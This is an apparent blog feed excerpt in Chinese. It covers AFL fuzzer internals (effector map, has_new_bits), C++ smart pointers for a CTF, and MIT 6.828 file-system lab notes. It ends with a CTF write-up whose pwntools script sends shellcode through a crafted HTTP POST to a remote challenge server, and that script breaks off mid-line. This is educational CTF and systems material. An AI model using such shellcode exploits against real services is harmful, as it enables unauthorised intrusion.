&lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];</span><br><span class="line">        a_len++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">          maybe_add_auto(a_collect, a_len);</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cksum != prev_cksum) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Otherwise, if the checksum has changed, see if we have something</span></span><br><span class="line"><span class="comment">           worthwhile queued up, and collect that if the answer is yes. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a_len &gt;= MIN_AUTO_EXTRA &amp;&amp; a_len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">          maybe_add_auto(a_collect, a_len);</span><br><span class="line"></span><br><span class="line">        a_len = <span class="number">0</span>;</span><br><span class="line">        prev_cksum = cksum;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Continue collecting string, but only if the bit flip actually made</span></span><br><span class="line"><span class="comment">         any difference - we don't want no-op tokens. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cksum != queue_cur-&gt;exec_cksum) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; <span class="number">3</span>];        </span><br><span class="line">        a_len++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">  stage_finds[STAGE_FLIP1]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">  stage_cycles[STAGE_FLIP1] += stage_max;</span><br></pre></td></tr></table></figure><p>后面跟着的就是2比特2比特的逐个翻转，4比特4比特位移是1位的逐个翻转，然后是1字节1字节的翻转等等等。。。。总之是长度不一，步长不同的比特反转。</p><p>在进行<code>bitflip 8/8变异</code>时，AFL还生成了一个非常重要的信息：<code>effector map</code>。这个effector map几乎贯穿了整个<code>deterministic</code> <code>fuzzing</code>的始终。</p><p>具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。</p><p>这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”<code>data</code>”，而非”<code>metadata</code>”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考<code>effector</code> <code>map</code>，跳过那些“无效”的byte，从而节省了执行资源。</p><p>由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了启发式的判断。看到这里，不得不叹服于AFL实现上的精妙。</p><p>不过，在某些情况下并不会检测有效字符。第一种情况就是dumb mode或者从fuzzer，此时文件所有的字符都有可能被变异。第二、第三种情况与文件本身有关：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Minimum input file length at which the effector logic kicks in: */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFF_MIN_LEN 128 </span></span><br><span class="line"><span class="comment">/* Maximum effector density past which everything is just fuzzed unconditionally (%): */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFF_MAX_PERC 90</span></span><br></pre></td></tr></table></figure><p>即默认情况下，如果文件小于128 bytes，那么所有字符都是“有效”的；同样地，如果AFL发现一个文件有超过90%的bytes都是“有效”的，那么也不差那10%了，大笔一挥，干脆把所有字符都划归为“有效”。</p><p>后面仍有arithmetic，interest，dictionary，havoc，splice，cycle等变异手段。具体可以参考<a href="https://rk700.github.io/2018/01/04/afl-mutations/" target="_blank" rel="noopener">https://rk700.github.io/2018/01/04/afl-mutations/</a>  此处不再赘述。</p><p>总而言之，AFL的变异策略既有逐位变异的运气成分，同时也合理运用了覆盖率反馈的信息来启发性的创造<code>token</code> 和 <code>effort map</code> 等概念，帮助算法更好的进行变异。</p><h3 id="3-2-save-if-interesting"><a href="#3-2-save-if-interesting" class="headerlink" title="3.2 save_if_interesting"></a>3.2 save_if_interesting</h3><p>覆盖率反馈信息除了一定程度上可以启发性的指导变异以外，最大作用就是在这个函数内实现的选种功能。</p><p>如果这个has_new_bits返回为0的话，那么该函数直接返回0，程序继续进行下一次的fuzz。但是如果发现了新的cov信息或者bb信息，那么就会将产生新路径的testcase保存为新的种子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(hnb = has_new_bits(virgin_bits))) &#123;</span><br><span class="line">      <span class="keyword">if</span> (crash_mode) total_crashes++;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代表<code>current</code> 是刚刚返回的覆盖率信息,<code>virgin_map</code>是当前我们的覆盖率状态。可以注意到<code>virgin_map</code>在<code>setup_shm</code>过程中被初始化成了全 <code>1</code> ,  代表<code>current</code>的<code>trace_bits</code> 初始化状态是全0的状态。根据插桩部分的逻辑，每有新的覆盖率信息，会在相应的<code>trace_bits</code>索引位置加一。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"><span class="built_in">memset</span>(trace_bits, <span class="number">0</span>, MAP_SIZE);</span><br></pre></td></tr></table></figure><p>每个<code>trace_bits</code>对应索引里的值其实就代表着走到这条路径的次数，当第<code>1，4，8，128</code>次走到这条路径时，<code>current</code>里的值就是<code>0</code>，而<code>virgin_map</code>里的值则是<code>ff</code>，此时函数将返回2<code>。</code>其余情况都会返回<code>1</code>。最后将<code>current</code>里的值取反，然后与<code>vrigin</code>相与，更新<code>virgin</code>的状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if the current execution path brings anything new to the table.</span></span><br><span class="line"><span class="comment">   Update virgin bits to reflect the finds. Returns 1 if the only change is</span></span><br><span class="line"><span class="comment">   the hit-count for a particular tuple; 2 if there are new tuples seen. </span></span><br><span class="line"><span class="comment">   Updates the map, so subsequent calls will always return 0.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This function is called after every exec() on a fairly large buffer, so</span></span><br><span class="line"><span class="comment">   it needs to be fast. We do this in 32-bit and 64-bit flavors. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> u8 <span class="title">has_new_bits</span><span class="params">(u8* virgin_map)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line"></span><br><span class="line">  u64* current = (u64*)trace_bits;</span><br><span class="line">  u64* virgin  = (u64*)virgin_map;</span><br><span class="line"></span><br><span class="line">  u32  i = (MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line">  u32* current = (u32*)trace_bits;</span><br><span class="line">  u32* virgin  = (u32*)virgin_map;</span><br><span class="line"></span><br><span class="line">  u32  i = (MAP_SIZE &gt;&gt; <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line"></span><br><span class="line">  u8   ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optimize for (*current &amp; *virgin) == 0 - i.e., no bits in current bitmap</span></span><br><span class="line"><span class="comment">       that have not been already cleared from the virgin map - since this will</span></span><br><span class="line"><span class="comment">       almost always be the case. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(*current) &amp;&amp; unlikely(*current &amp; *virgin)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (likely(ret &lt; <span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        u8* cur = (u8*)current;</span><br><span class="line">        u8* vir = (u8*)virgin;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Looks like we have not found any new bytes yet; see if any non-zero</span></span><br><span class="line"><span class="comment">           bytes in current[] are pristine in virgin[]. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) || (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">4</span>] &amp;&amp; vir[<span class="number">4</span>] == <span class="number">0xff</span>) || (cur[<span class="number">5</span>] &amp;&amp; vir[<span class="number">5</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">6</span>] &amp;&amp; vir[<span class="number">6</span>] == <span class="number">0xff</span>) || (cur[<span class="number">7</span>] &amp;&amp; vir[<span class="number">7</span>] == <span class="number">0xff</span>)) ret = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">            (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) || (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>)) ret = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span> ret = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      *virgin &amp;= ~*current;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    current++;</span><br><span class="line">    virgin++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ret &amp;&amp; virgin_map == virgin_bits) bitmap_changed = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>AFL源码分析（I）——白盒模式下的afl-gcc分析 - 安全客，安全资讯平台 (<a href="http://anquanke.com/" target="_blank" rel="noopener">anquanke.com</a>)</p><p>[AFL内部实现细节小记](</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在写跟AFL有关的fuzz，因此就大概过了一下AFL的源码。这里大概记录一下自己看的过程。&lt;/p&gt;
    
    </summary>
    
    
      <category term="fuzz" scheme="wood1314.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>ByteCtf writeup</title>
    <link href="wood1314.github.io/year/10/17/clgvp3n4e000b6n3fevhj79r8/"/>
    <id>wood1314.github.io/year/10/17/clgvp3n4e000b6n3fevhj79r8/</id>
    <published>2021-10-17T10:00:00.000Z</published>
    <updated>2021-11-19T15:29:08.329Z</updated>
    
    <content type="html"><![CDATA[<p>这个题主要是熟悉一下智能指针的使用，以及可能会出现的相关漏洞</p><a id="more"></a><p>智能指针的原理是，接受一个申请好的内存地址，构造一个保存在栈上的智能指针对象，当程序退出栈的作用域范围后，由于栈上的变量自动被销毁，智能指针内部保存的内存也就被释放掉了（除非将智能指针保存起来）。</p><p>　　C++11提供了三种智能指针：std::shared_ptr, std::unique_ptr, std::weak_ptr，使用时需添加头文件 <memory>。</memory></p><p>　　shared_ptr使用引用计数，每一个shared_ptr的拷贝都指向相同的内存。每使用他一次，内部的引用计数加1，每析构一次，内部的引用计数减1，减为0时，删除所指向的堆内存。shared_ptr内部的引用计数是安全的，但是对象的读取需要加锁。</p><h2 id="bytezoom"><a href="#bytezoom" class="headerlink" title="bytezoom"></a>bytezoom</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个题主要是熟悉一下智能指针的使用，以及可能会出现的相关漏洞&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MIT6.828 lab5</title>
    <link href="wood1314.github.io/year/10/17/clgvp3n5400136n3fa7re8nqu/"/>
    <id>wood1314.github.io/year/10/17/clgvp3n5400136n3fa7re8nqu/</id>
    <published>2021-10-17T09:36:16.000Z</published>
    <updated>2021-10-17T09:57:07.329Z</updated>
    
    <content type="html"><![CDATA[<p>关于文件系统的lab</p><a id="more"></a><h2 id="File-system-preliminaries"><a href="#File-system-preliminaries" class="headerlink" title="File system preliminaries"></a>File system preliminaries</h2><p>我们要完成一个相对简单的文件系统，其可以实现创建、读、写以及删除在分层目录结构中组织的文件。目前我们的OS只支持单用户，因此我们的文件系统也不支持UNIX文件拥有或权限的概念。同时也不支持硬链接、符号链接、时间戳或是特别的设备文件。</p><h2 id="On-Disk-File-System-Structure"><a href="#On-Disk-File-System-Structure" class="headerlink" title="On-Disk File System Structure"></a>On-Disk File System Structure</h2><p>大多是 Unix 文件系统将磁盘空间分为 inode和数据 区域。目录包含文件名和指向inode的指针; 如果文件系统中的多个目录引用该文件的inode，则称文件是硬链接的。由于我们的文件系统不需要支持硬链接，因此我们不需要这一间接层并且能做一个方便的简化：我们的文件系统根本不使用inode，相反我们仅仅将所有文件(或子目录)的 meta-data存储在描述该文件的唯一的目录中(directory entry)。 文件和目录逻辑上都是由一系列数据blocks组成，这些blocks分散在磁盘中，文件系统屏蔽blocks分布的细节，提供一个可以顺序读写文件的接口。</p><h2 id="补充-inode"><a href="#补充-inode" class="headerlink" title="补充 inode"></a>补充 <code>inode</code></h2><p>操作系统读取硬盘的时候，不会一个个扇区的读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个“块”（block）。这种由多个扇区组成的“块”，是文件存取的最小单位。“块”的大小，最常见的是4KB，即连续八个sector组成一个block。</p><p><strong>文件数据都储存在“块”中，那么很显然，我们还必须找到一个地方储存文件的“元信息”，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做*inode*，中文译名为”*索引节点*“。 具体包括以下内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">* 文件的字节数</span><br><span class="line"></span><br><span class="line">　　* 文件拥有者的User ID</span><br><span class="line"></span><br><span class="line">　　* 文件的Group ID</span><br><span class="line"></span><br><span class="line">　　* 文件的读、写、执行权限</span><br><span class="line"></span><br><span class="line">　　* 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。</span><br><span class="line"></span><br><span class="line">　　* 链接数，即有多少文件名指向这个inode</span><br><span class="line"></span><br><span class="line">　　* 文件数据block的位置</span><br></pre></td></tr></table></figure><p><strong>每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。</strong></p><p>每个inode都有一个号码，操作系统用inode号码来识别不同的文件。</p><p>这里值得重复一遍，Unix/Linux系统内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或者绰号。</p><p>表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：<strong>首先，系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。</strong></p><h2 id="Sectors-and-Blocks"><a href="#Sectors-and-Blocks" class="headerlink" title="Sectors and Blocks"></a>Sectors and Blocks</h2><p>大部分磁盘都是以Sector为粒度进行读写，JOS中Sectors为512字节。文件系统以block为单位分配和使用磁盘。注意区别，<code>sector</code> <code>size</code>是磁盘的属性，<code>block</code> <code>size</code>是操作系统使用磁盘的粒度。JOS的文件系统的block size被定为4096字节 ( 4kB ) 。</p><h2 id="Superblocks"><a href="#Superblocks" class="headerlink" title="Superblocks"></a>Superblocks</h2><p>我们的文件系统使用一个superblock，<strong>位于磁盘的block 1。block 0被用来保存boot loader和分区表。</strong></p><p>我们的文件系统使用一个superblock，<strong>位于磁盘的block 1。block 0被用来保存boot loader和分区表。</strong></p><p><img src="https://pic.imgdb.cn/item/616bf1282ab3f51d91a140bc.png" alt></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Super</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> s_magic;        <span class="comment">// Magic number: FS_MAGIC</span></span><br><span class="line">    <span class="keyword">uint32_t</span> s_nblocks;        <span class="comment">// Total number of blocks on disk</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">File</span> <span class="title">s_root</span>;</span>        <span class="comment">// Root directory node</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="File-Meta-data"><a href="#File-Meta-data" class="headerlink" title="File Meta-data"></a>File Meta-data</h2><p>我们的文件系统使用struct File结构描述文件，该结构包含文件名，大小，类型，保存文件内容的block号。struct File结构的f_direct数组保存前NDIRECT（10）个block号，这样对于10*4096=40KB的文件不需要额外的空间来记录内容block号。对于更大的文件我们分配一个额外的block来保存4096/4=1024 block号。</p><p><img src="https://pic.imgdb.cn/item/616bf1bf2ab3f51d91a1d54d.png" alt></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">inc/fs.h</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> f_name[MAXNAMELEN];    <span class="comment">// filename</span></span><br><span class="line">    <span class="keyword">off_t</span> f_size;           <span class="comment">// file size in bytes</span></span><br><span class="line">    <span class="keyword">uint32_t</span> f_type;        <span class="comment">// file type</span></span><br><span class="line">    <span class="comment">// Block pointers.</span></span><br><span class="line">    <span class="comment">// A block is allocated iff its value is != 0.</span></span><br><span class="line">    <span class="keyword">uint32_t</span> f_direct[NDIRECT]; <span class="comment">// direct blocks</span></span><br><span class="line">    <span class="keyword">uint32_t</span> f_indirect;        <span class="comment">// indirect block</span></span><br><span class="line">    <span class="comment">// Pad out to 256 bytes; must do arithmetic in case we're compiling</span></span><br><span class="line">    <span class="comment">// fsformat on a 64-bit machine.</span></span><br><span class="line">    <span class="keyword">uint8_t</span> f_pad[<span class="number">256</span> - MAXNAMELEN - <span class="number">8</span> - <span class="number">4</span>*NDIRECT - <span class="number">4</span>];</span><br><span class="line">&#125; __attribute__((packed));  <span class="comment">// required only on some 64-bit machines</span></span><br></pre></td></tr></table></figure><h2 id="Directories-versus-Regular-Files"><a href="#Directories-versus-Regular-Files" class="headerlink" title="Directories versus Regular Files"></a>Directories versus Regular Files</h2><p>File结构既能代表文件也能代表目录，由type字段区分，文件系统以相同的方式管理文件和目录，只是目录文件的内容是一系列File结构，这些File结构描述了在该目录下的文件或者子目录。超级块中包含一个File结构，代表文件系统的根目录。</p><h2 id="The-Block-Cache"><a href="#The-Block-Cache" class="headerlink" title="The Block Cache"></a>The Block Cache</h2><p>我们的文件系统最大支持3GB，文件系统进程保留从0x10000000 (DISKMAP)到0xD0000000 (DISKMAP+DISKMAX)固定3GB的内存空间作为磁盘的缓存。比如block 0被映射到虚拟地址0x10000000，block 1被映射到虚拟地址0x10001000以此类推。</p><p>由于我们的文件系统有独立于系统中其他环境的虚拟地址空间（不重叠），因为我们的文件系统唯一需要做的事是实现文件的 access。如此看来我们为文件系统保留大量的空间也是十分合理的。</p><p>如果将整个磁盘全部读到内存将非常耗时，所以我们将实现按需加载，只有当访问某个block对应的内存地址时出现页错误，才将该block从磁盘加载到对应的内存区域，然后重新执行内存访问指令。</p><h2 id="The-file-system-interface"><a href="#The-file-system-interface" class="headerlink" title="The file system interface"></a>The file system interface</h2><p>到目前为止，文件系统进程已经能提供各种操作文件的功能了，但是其他用户进程不能直接调用这些函数。我们通过进程间函数调用(RPC)对其它进程提供文件系统服务。RPC机制原理如下：</p><ul><li><p>RPC（Remote Procedure Call ）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Regular env           FS env</span><br><span class="line">   +---------------+   +---------------+</span><br><span class="line">   |      read     |   |   file_read   |</span><br><span class="line">   |   (lib/fd.c)  |   |   (fs/fs.c)   |</span><br><span class="line">...|.......|.......|...|.......^.......|...............</span><br><span class="line">   |       v       |   |       |       | RPC mechanism</span><br><span class="line">   |  devfile_read |   |  serve_read   |</span><br><span class="line">   |  (lib/file.c) |   |  (fs/serv.c)  |</span><br><span class="line">   |       |       |   |       ^       |</span><br><span class="line">   |       v       |   |       |       |</span><br><span class="line">   |     fsipc     |   |     serve     |</span><br><span class="line">   |  (lib/file.c) |   |  (fs/serv.c)  |</span><br><span class="line">   |       |       |   |       ^       |</span><br><span class="line">   |       v       |   |       |       |</span><br><span class="line">   |   ipc_send    |   |   ipc_recv    |</span><br><span class="line">   |       |       |   |       ^       |</span><br><span class="line">   +-------|-------+   +-------|-------+</span><br><span class="line">           |                   |</span><br><span class="line">           +-------------------+</span><br></pre></td></tr></table></figure></li></ul><p>本质上RPC还是借助IPC机制实现的。</p><p>在开始时，<code>read</code>只需调度到适当的设备读取函数，就可以适用于任何文件描述符，在本例中为devfile_read（我们可以有更多的设备类型，如管道）。 devfile_read专门为磁盘文件实现读取。 这个和lib / file.c中的其他devfile_ *函数实现了FS操作的客户端，并且所有工作都以大致相同的方式工作，在请求结构体中捆绑参数，调用fsipc发送IPC请求，以及解包和返回 结果。 fsipc函数只处理向服务器发送请求和接收回复的常见细节。</p><p>相关数据结构之间的关系可用下图来表示：</p><p><img src="https://pic.imgdb.cn/item/616bf2c12ab3f51d91a2aea4.png" alt></p><h2 id="Sharing-library-state-across-fork-and-spawn"><a href="#Sharing-library-state-across-fork-and-spawn" class="headerlink" title="Sharing library state across fork and spawn"></a>Sharing library state across fork and spawn</h2><p>通过给页表项设置PTE_SHARE标志，然后在拷贝页表时直接让他们对相同的物理地址进行映射，达到共享内存的效果。</p><h2 id="总结回顾"><a href="#总结回顾" class="headerlink" title="总结回顾"></a>总结回顾</h2><ol><li><p>通过给页表项设置PTE_SHARE标志，然后在拷贝页表时直接让他们对相同的物理地址进行映射，达到共享内存的效果。</p><ol><li><p>引入一个<code>文件系统进程</code>的特殊进程，该进程提供文件操作的接口。具体实现在fs/bc.c，fs/fs.c，fs/serv.c中。</p></li><li><p><strong>建立RPC机制</strong>，客户端进程向FS进程发送请求，FS进程真正执行文件操作。客户端进程的实现在lib/file.c，lib/fd.c中。客户端进程和FS进程交互可总结为下图</p><p><img src="https://pic.imgdb.cn/item/616bf3432ab3f51d91a32334.png" alt></p></li></ol></li><li><p>支持从磁盘加载程序并运行。实现spawn()，该函数创建一个新的进程，并从磁盘加载程序运行，类似UNIX中的fork()后执行exec()。</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于文件系统的lab&lt;/p&gt;
    
    </summary>
    
    
      <category term="6.828" scheme="wood1314.github.io/tags/6-828/"/>
    
  </entry>
  
  <entry>
    <title>能源赛 wp</title>
    <link href="wood1314.github.io/year/10/16/clgvp3n79006l6n3frcy74k4z/"/>
    <id>wood1314.github.io/year/10/16/clgvp3n79006l6n3frcy74k4z/</id>
    <published>2021-10-16T03:05:44.000Z</published>
    <updated>2021-10-17T09:28:17.078Z</updated>
    
    <content type="html"><![CDATA[<p>主要是看到的shellcode的骚操作</p><a id="more"></a><h2 id="easyHtpp"><a href="#easyHtpp" class="headerlink" title="easyHtpp"></a>easyHtpp</h2><p>题⽬是⼀道简单http服务器，经过检查POST参数是/tryShellcode之后会执⾏shellcode，构造 body⻓度和我们shellcode⻓度相同后再绕过沙盒保护对system的限制即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#sh = process('./easyHttp')</span></span><br><span class="line">sh = remote(<span class="string">'106.14.120.231'</span>,<span class="number">29792</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeHeader</span><span class="params">(shellcode)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"POST /tryShellcode HTTP/1.0\r\nContent-Length: "</span> + str(len(shell</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Login</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"POST /login HTTP/1.0\r\nNAME: 1\nPass: 1\r\n\r\n"</span></span><br><span class="line"><span class="comment"># gdb.attach(sh,'b* $rebase(0x1F0F)')</span></span><br><span class="line">sh.recvuntil(<span class="string">'test&gt; \n'</span>)</span><br><span class="line">sh.sendline(Login())</span><br><span class="line">sh.recvuntil(<span class="string">'test&gt; \n'</span>)</span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">"flag"</span>, fd=<span class="number">1</span>))</span><br><span class="line">payload = makeHeader(shellcode)</span><br><span class="line">sh.sendline(payload)</span><br><span 